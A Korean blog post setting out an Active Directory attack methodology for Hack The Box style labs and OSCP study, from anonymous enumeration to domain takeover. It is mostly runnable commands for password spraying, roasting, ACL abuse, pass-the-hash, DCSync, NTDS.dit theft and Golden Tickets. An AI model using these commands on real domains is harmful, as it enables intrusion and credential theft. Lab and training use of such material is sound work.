---
title: "AD 공격 방법론 — 제로에서 도메인 관리자까지"
date: 2026-03-24
weight: 20
draft: false
tags: ["active-directory", "methodology", "bloodhound", "kerberos"]
summary: "AD 박스에서 도메인 관리자까지 가는 공격 체인. 초기 침투 이후의 판단 순서를 정리했다."
---

모든 AD 박스는 같은 패턴을 따른다. 아무것도 없는 상태에서 시작해서, 틈을 찾고, 그 틈을 넓히고, 도메인을 장악한다. 체인 자체는 예측 가능하다. 달라지는 것은 각 고리가 어디서 끊어지느냐다.

이것은 내가 모든 AD 박스에서 따르는 방법론이다. Active, Forest, Blackfield 같은 박스를 직접 풀면서 정리한 것이지 이론이 아니다.

---

## Phase 0 — 셋업

박스에 손대기 전. 나중에 30분의 혼란을 막아주는 30초짜리 셋업.

### /etc/hosts 에 도메인 추가

```bash
echo "$IP domain.htb dc01.domain.htb" | sudo tee -a /etc/hosts
```

**도메인 이름과 DC 호스트명 둘 다 추가한다.** Kerberos 인증은 정확한 호스트명 해석을 요구한다. 도구가 이상한 오류를 뿜는다면 /etc/hosts 를 먼저 확인한다. 이걸로 쓸데없이 시간을 낭비한 적이 한두 번이 아니다.

### 시계 동기화

```bash
sudo ntpdate -s $IP
```

Kerberos 는 시간에 민감하다. 시계가 DC 와 5분 이상 어긋나면 인증이 실패한다. 유용한 오류 메시지도 없이 그냥 실패한다. 시작 전에 동기화한다.

### 작업 디렉터리 생성

```bash
mkdir -p {scans,loot,bloodhound}
```

출력이 많이 쌓일 것이다. 정리하지 않으면 묻힌다.

---

## Phase 1 — 자격 증명 없음

아무것도 없다. 목표는 단순하다: **사용자명 하나, 비밀번호 하나, 뭐든 하나.**

### 1.1 — Null Session 열거

인증 없이 가능한 것은 전부 시도한다. 뭔가 하나는 대답한다.

```bash
# SMB null session
crackmapexec smb $IP -u '' -p ''
smbclient -N -L //$IP/
smbmap -H $IP -u '' -p ''

# RPC null session
rpcclient -U '' -N $IP
> enumdomusers
> enumdomgroups
> querydispinfo

# LDAP anonymous bind
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=htb"
```

**내가 노리는 것:** 사용자명. 그게 최우선이다. 유효한 사용자명 하나가 문을 연다.

**Forest** 에서는 null RPC 가 전체 사용자 목록을 줬다. 그게 foothold 전부였다 — 그 사용자들 중 하나를 AS-REP Roasting.

### 1.2 — Kerberos 를 통한 사용자 열거

null session 이 아무것도 주지 않으면 Kerberos 가 종종 잠금 없이 유효한 사용자명을 확인해 준다.

```bash
kerbrute userenum -d domain.htb --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

유효한 사용자는 유효하지 않은 사용자와 다른 응답을 반환한다. 잠금 위험 없음. 유효한 사용자에 대한 실패 로그온 이벤트도 없다.

### 1.3 — AS-REP Roasting (Pre-Auth 비활성)

사용자명을 얻는 즉시 — 몇 개뿐이라도 — 바로 시도한다.

```bash
impacket-GetNPUsers domain.htb/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
```

계정에 "Kerberos preauthentication 필요 안 함" 이 설정되어 있으면 해시를 얻는다. 크랙한다.

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

**Forest 의 경로가 이랬다.** null RPC → 사용자 목록 → AS-REP Roast → 첫 자격 증명. 깔끔한 체인.

### 1.4 — SMB 공유 열거 (Guest/Anonymous)

자격 없이 읽을 수 있는 공유가 있다. 또는 guest 접근.

```bash
smbmap -H $IP -u 'guest' -p ''
crackmapexec smb $IP -u 'guest' -p '' --shares
```

**Active** 에서는 `Replication` 공유가 익명으로 읽을 수 있었다. `Groups.xml` 파일에 GPP 비밀번호가 들어 있었다. 그게 foothold 였다.

**읽을 수 있는 공유의 모든 것을 반드시 다운로드하고 검사한다:**

```bash
smbget -R smb://$IP/sharename/
```

찾아야 할 것:

- **GPP 파일** (`Groups.xml`) — 암호화된 비밀번호 포함, `gpp-decrypt` 로 복호화 가능

- **스크립트** — 로그온 스크립트, 배치 파일, 하드코딩된 자격 증명이 담긴 PowerShell 스크립트

- **설정 파일** — web.config, 연결 문자열, 자격 증명이 들어간 모든 것

- **문서** — 비밀번호 정책, 기본 비밀번호, 온보딩 문서

### 1.5 — SNMP Walk

UDP 161 이 열려 있으면:

```bash
snmpwalk -v2c -c public $IP 1.3.6.1
```

SNMP 는 실행 중인 프로세스, 설치된 소프트웨어, 때로는 자격 증명이 담긴 명령줄까지 덤프할 수 있다.

### 1.6 — DNS Zone Transfer

```bash
dig axfr @$IP domain.htb
```

서브도메인, 호스트명, 때로는 몰랐던 다른 DC 나 서버를 드러낸다.

### Decision Point — Phase 1 끝

자격 증명이 생겼으면 → Phase 2. 사용자명만 있고 비밀번호가 없으면 → password spray.

```bash
# Password spraying (잠금 정책 주의!)
crackmapexec smb $IP -u users.txt -p 'Season2026!' --continue-on-success
```

**시도할 비밀번호:** `Welcome1`, `Password123`, `CompanyName2026!`, `Season+Year+!`. 가능하면 먼저 비밀번호 정책을 확인한다:

```bash
crackmapexec smb $IP -u '' -p '' --pass-pol
```

아무것도 없으면 → 웹 서비스 확인, 다른 공격 벡터 확인. 때로는 AD foothold 가 같은 박스의 웹 앱을 통해 나온다.

---

## Phase 2 — 첫 자격 증명

도메인 사용자명과 비밀번호가 있다. 게임이 완전히 바뀐다.

### 2.1 — 검증과 접근 테스트

먼저 내 자격 증명이 무엇을 할 수 있는지 확인한다.

```bash
# 여러 서비스에 자격 증명 테스트
crackmapexec smb $IP -u 'user' -p 'password'
crackmapexec winrm $IP -u 'user' -p 'password'
crackmapexec mssql $IP -u 'user' -p 'password'
crackmapexec ldap $IP -u 'user' -p 'password'
```

WinRM 에서 `(Pwn3d!)` 태그가 보이면 쉘 접근이 가능하다는 뜻. 보이면 → 즉시 `evil-winrm`.

```bash
evil-winrm -i $IP -u 'user' -p 'password'
```

### 2.2 — BloodHound 수집

**유효한 자격 증명을 얻는 즉시 실행한다.** 나중에 하지 않는다. 지금.

```bash
bloodhound-python -u 'user' -p 'password' -d domain.htb -ns $IP -c all
```

이것은 사용자, 그룹, 세션, ACL, 트러스트 — 모든 것을 수집한다. JSON 파일을 BloodHound 에 임포트한다.

**BloodHound 에서 찾아야 할 것:**

1. "Shortest Path to Domain Admin" — 명백한 첫 확인

2. "Shortest Path from Owned Principals" — 먼저 자신의 사용자를 owned 로 표시

3. Kerberoastable 계정 — 어떤 SPN 이 있는지 확인

4. DCSync 권한이 있는 사용자

5. 위험한 권한이 있는 계정 — GenericAll, GenericWrite, WriteDACL, ForceChangePassword, AddMember

**Blackfield** 에서는 BloodHound 가 내가 장악한 사용자가 다른 계정에 `ForceChangePassword` 권한을 가진다고 보여줬다. 그게 전체 권한 상승 경로였다. 수동으로 찾았다면 한참 걸렸을 것이다.

### 2.3 — Kerberoasting

이제 인증되었다. SPN 이 있는 서비스 계정을 노린다.

```bash
impacket-GetUserSPNs domain.htb/user:password -dc-ip $IP -request -outputfile kerberoast.hash
```

해시를 크랙한다:

```bash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

서비스 계정은 종종 약한 비밀번호와 높은 권한을 가진다. **Active** 에서는 Administrator 계정의 SPN 을 Kerberoasting 하여 도메인을 얻었다. 첫 자격 증명에서 DA 까지 직행.

**크랙 우선순위:** Domain Admins 이거나 관리자급 접근 권한이 있는 계정 (BloodHound 가 알려준다).

### 2.4 — 인증된 공유 열거

이제 더 많은 공유가 보인다.

```bash
smbmap -H $IP -u 'user' -p 'password'
crackmapexec smb $IP -u 'user' -p 'password' --shares
```

이전에 보이지 않던 새 공유를 찾는다. SYSVOL 과 NETLOGON 은 항상 확인할 가치가 있다:

```bash
smbclient //$IP/SYSVOL -U 'user%password'
smbclient //$IP/NETLOGON -U 'user%password'
```

SYSVOL 에는 그룹 정책이, NETLOGON 에는 로그온 스크립트가 있다. 둘 다 자격 증명을 포함할 수 있다.

### 2.5 — 인증된 LDAP 덤프

```bash
# 상세 정보 포함 모든 사용자
ldapsearch -x -H ldap://$IP -D "[email protected]" -w 'password' -b "DC=domain,DC=htb" '(objectClass=person)' sAMAccountName description memberOf servicePrincipalName

# 컴퓨터
ldapsearch -x -H ldap://$IP -D "[email protected]" -w 'password' -b "DC=domain,DC=htb" '(objectClass=computer)' cn operatingSystem
```

description 필드를 확인한다. 관리자들은 생각보다 자주 비밀번호를 거기에 넣는다.

### 2.6 — ACL 악용

BloodHound 가 위험한 권한을 찾았다면? 이제 악용한다.

**사용자에 대한 GenericAll:**

```bash
# 비밀번호 재설정
net rpc password "targetuser" "NewPass123!" -U "domain.htb/user%password" -S $IP
```

**사용자에 대한 GenericWrite:**

```bash
# targeted Kerberoasting 를 위한 SPN 설정
impacket-addspn -u 'domain.htb/user' -p 'password' -t 'targetuser' -s 'HTTP/fake' "dc01.domain.htb"
# 그런 다음 그들을 Kerberoast
```

**WriteDACL:**

```bash
# 자신에게 DCSync 권한 부여
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'user' -target-dn 'DC=domain,DC=htb' "domain.htb/user:password"
```

**ForceChangePassword:**

```bash
rpcclient -U 'user%password' $IP
> setuserinfo2 targetuser 23 'NewPass123!'
```

**그룹에 대한 AddMember:**

```bash
net rpc group addmem "Target Group" "user" -U "domain.htb/user%password" -S $IP
```

### Decision Point — Phase 2 끝

관리자 자격 증명을 얻었으면 → Phase 4 (도메인 장악). 다른 사용자의 자격 증명을 얻었으면 → 새 사용자로 Phase 2 반복, 그들이 무엇에 접근할 수 있는지 확인. 어떤 머신에 local admin 이면 → Phase 3 (측면 이동). 막혔으면 → BloodHound 를 다시 확인. 다른 쿼리 시도. 그룹 멤버십을 더 자세히 본다.

---

## Phase 3 — 측면 이동

자격 증명(비밀번호 또는 해시)이 있고 다른 머신으로 이동해야 한다.

### 3.1 — 도구 선택

**원격 실행을 위한 의사결정 트리:**

- **비밀번호 + WinRM 열림 (5985)?** → `evil-winrm` (가장 깔끔한 쉘)

- **해시 + WinRM 열림?** → `evil-winrm -H <hash>` (Pass the Hash)

- **비밀번호 + WinRM 없음?** → `impacket-psexec` (admin 필요, SYSTEM 으로 떨어짐)

- **해시 + WinRM 없음?** → `impacket-psexec -hashes :NTLM_HASH` (PtH)

- **은밀해야 한다면?** → `impacket-wmiexec` (psexec 보다 조용함)

- **psexec 실패?** → `impacket-smbexec` 또는 `impacket-atexec` 를 대안으로

```bash
# 비밀번호로 Evil-WinRM
evil-winrm -i $TARGET -u 'admin' -p 'password'

# 해시로 Evil-WinRM (Pass the Hash)
evil-winrm -i $TARGET -u 'admin' -H 'NTLM_HASH'

# 비밀번호로 PsExec
impacket-psexec domain.htb/admin:password@$TARGET

# 해시로 PsExec
impacket-psexec -hashes :NTLM_HASH domain.htb/admin@$TARGET

# WMIExec (더 조용함)
impacket-wmiexec domain.htb/admin:password@$TARGET
```

### 3.2 — 장악한 호스트에서 자격 증명 수집

머신에 들어가면 모든 것을 수집한다.

```bash
# SAM 덤프 (로컬 계정)
impacket-secretsdump admin:password@$TARGET

# 또는 쉘에서:
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# 다운로드 후 오프라인 추출:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

**찾아야 할 것:**

- 로컬 admin 해시 (여러 머신에서 재사용?)

- 캐시된 도메인 자격 증명

- LSA secrets

### 3.3 — 자격 증명 재사용

#1 측면 이동 기법. 가진 모든 자격 증명을 모든 머신에 시도한다.

```bash
# 모든 호스트에 해시 스프레이
crackmapexec smb targets.txt -u 'admin' -H 'NTLM_HASH' --continue-on-success
```

로컬 admin 비밀번호 재사용은 매우 흔하다. 해시 하나가 여러 머신을 준다.

### 3.4 — 토큰 / 세션 악용 (쉘에서)

권한 있는 사용자가 로그인한 머신에 쉘이 있을 때:

```powershell
# 토큰 확인 (SeImpersonatePrivilege 필요)
# Rubeus, Incognito, PrintSpoofer 같은 도구 사용
whoami /priv
```

`SeImpersonatePrivilege` 가 있으면 → SYSTEM 을 위한 Potato 공격 (PrintSpoofer, GodPotato 등).

---

## Phase 4 — 도메인 장악

Domain Admin 급 접근 권한이 있다. 이제 증명한다.

### 4.1 — DCSync

모든 도메인 해시를 덤프하는 가장 깔끔한 방법. 복제 권한 필요 (Domain Admins 는 기본적으로 가짐).

```bash
impacket-secretsdump domain.htb/admin:password@$DC_IP
```

이것은 다음을 덤프한다:

- **모든 도메인 사용자 NTLM 해시** (krbtgt 포함)

- **모든 도메인 컴퓨터 해시**

- **Kerberos 키**

`Administrator` NTLM 해시와 `krbtgt` 해시가 필요하다.

```bash
# Administrator 만 DCSync
impacket-secretsdump -just-dc-user Administrator domain.htb/admin:password@$DC_IP

# krbtgt 만 DCSync (Golden Ticket 용)
impacket-secretsdump -just-dc-user krbtgt domain.htb/admin:password@$DC_IP
```

### 4.2 — NTDS.dit 추출

DCSync 의 대안. 데이터베이스 파일을 직접 가져온다.

```bash
# DC 의 admin 쉘에서
# shadow copy 생성
vssadmin create shadow /for=C:

# shadow 에서 NTDS.dit 복사
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system.bak

# 두 파일 다운로드 후 오프라인 추출
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

### 4.3 — Golden Ticket

`krbtgt` 해시로 어떤 사용자에 대한 티켓도 위조할 수 있다. krbtgt 재설정 전까지는 비밀번호 재설정을 살아남는 지속성.

```bash
# 도메인 SID 가져오기
impacket-lookupsid domain.htb/admin:password@$DC_IP

# Golden Ticket 위조
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.htb Administrator

# 사용
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.htb/[email protected]
```

OSCP 에서는 보통 DCSync 만으로 도메인 장악을 증명하기 충분하다. Golden Ticket 은 이해하면 좋지만 대부분의 시험 시나리오에서는 과하다.

### 4.4 — Domain Controller 에 Pass the Hash

DA NTLM 해시가 있으면 그냥 직접 사용한다.

```bash
# DC 에 쉘
impacket-psexec -hashes :DA_NTLM_HASH domain.htb/Administrator@$DC_IP
evil-winrm -i $DC_IP -u 'Administrator' -H 'DA_NTLM_HASH'
```

가장 간단한 경로. DCSync 의 해시 → PtH → DC 에 쉘 → proof.txt.

---

## 전체 체인 — 시각화

```gdscript3
Phase 1 (No Creds)
├── Null sessions → usernames
├── Kerberos user enum → usernames
├── AS-REP Roasting → password hash
├── Anonymous shares → credentials/info
├── SNMP/DNS → info gathering
└── Password spraying → first creds
         │
         ▼
Phase 2 (First Creds)
├── BloodHound → attack paths
├── Kerberoasting → service account hashes
├── Share enumeration → more creds/info
├── LDAP dump → users, descriptions, groups
├── ACL abuse → privilege escalation
└── Credential reuse → more access
         │
         ▼
Phase 3 (Lateral Movement)
├── Pass the Hash → other machines
├── Evil-WinRM → shells
├── PsExec/WMIExec → shells
├── SAM/LSA dumps → more hashes
└── Token abuse → higher privileges
         │
         ▼
Phase 4 (Domain Compromise)
├── DCSync → all hashes
├── NTDS.dit → offline extraction
├── Golden Ticket → persistence
└── PtH as DA → proof.txt
```

---

## AD 박스에서 내가 저지른 흔한 실수

1. **BloodHound 를 즉시 실행하지 않음.** 예전에는 자격 증명을 얻고 수동으로 열거했다. BloodHound 는 수동으로는 몇 시간 걸릴 경로를 몇 초에 보여준다. 먼저 실행한다. 항상.

2. **시간 동기화를 잊음.** 시계가 어긋나면 Kerberos 도구가 조용히 실패하거나 암호 같은 오류를 낸다. 시작 전에 `ntpdate`.

3. **ACL 을 확인하지 않음.** DA 로 가는 경로는 직접 익스플로잇이 아니라 ACL 악용인 경우가 많다. BloodHound 의 edge 분석이 황금이다.

4. **모든 것을 크랙하려 함.** 모든 Kerberoast 해시가 크랙되는 것은 아니다. rockyou 로 5분 안에 안 풀리면 넘어가고 다른 경로를 찾는다.

5. **비밀번호 재사용을 무시함.** 자격 증명 한 세트는 모든 서비스, 모든 머신에 대해 테스트해야 한다. `--continue-on-success` 로 모든 발견된 호스트에 `crackmapexec`.

6. **발견한 호스트명을 /etc/hosts 에 추가하지 않음.** BloodHound 나 LDAP 에서 발견한 모든 호스트명 — 추가한다. 어떤 도구는 정확한 이름 해석을 요구한다.

---

## 치트시트 — Phase 별 도구

| Phase | 도구 | 용도 |
| --- | --- | --- |
| 0 | ntpdate | 시계 동기화 |
| 1 | crackmapexec | Null session, spraying |
| 1 | kerbrute | 사용자 열거 |
| 1 | impacket-GetNPUsers | AS-REP Roasting |
| 1 | enum4linux | SMB 열거 |
| 2 | bloodhound-python | AD 데이터 수집 |
| 2 | impacket-GetUserSPNs | Kerberoasting |
| 2 | ldapsearch | LDAP 열거 |
| 2 | smbmap | 공유 열거 |
| 3 | evil-winrm | 원격 쉘 (WinRM) |
| 3 | impacket-psexec | 원격 쉘 (SMB) |
| 3 | impacket-wmiexec | 원격 쉘 (WMI) |
| 3 | impacket-secretsdump | 자격 증명 덤프 |
| 4 | impacket-secretsdump | DCSync |
| 4 | impacket-ticketer | Golden Ticket |

---

체인은 항상 같다: **열거 → 틈 찾기 → 권한 상승 → DA 가 될 때까지 반복.** 달라지는 것은 각 틈을 어디서 찾느냐다. BloodHound 와 체계적인 열거가 추측보다 빠르게 찾는다.

- [Active-Directory](https://heretek.dev/tags/active-directory/)
- [Methodology](https://heretek.dev/tags/methodology/)
- [Bloodhound](https://heretek.dev/tags/bloodhound/)
- [Kerberos](https://heretek.dev/tags/kerberos/)